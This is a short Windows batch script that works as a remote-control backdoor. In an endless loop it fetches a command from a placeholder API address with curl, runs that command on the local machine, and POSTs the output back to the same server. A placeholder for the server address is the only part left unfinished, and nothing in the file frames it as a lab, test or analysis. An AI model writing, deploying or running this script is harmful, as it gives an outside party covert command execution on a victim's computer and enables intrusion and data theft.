@echo off

setlocal enabledelayedexpansion
set apilink=YOURAPILINKHERE
:CHECK_CMD_CHANGE

curl -o cmd.txt %apilink%/getcmd

set /p new_cmd=<cmd.txt
del cmd.txt
if "%new_cmd%"=="%cmd%" (
  timeout /t 2 /nobreak >nul
  goto CHECK_CMD_CHANGE
)

set "cmd=%new_cmd%"

%cmd% >output.txt

set /p output=<output.txt

curl -X POST -d "output=!output!" %apilink%/setoutput
del output.txt
goto CHECK_CMD_CHANGE

endlocal
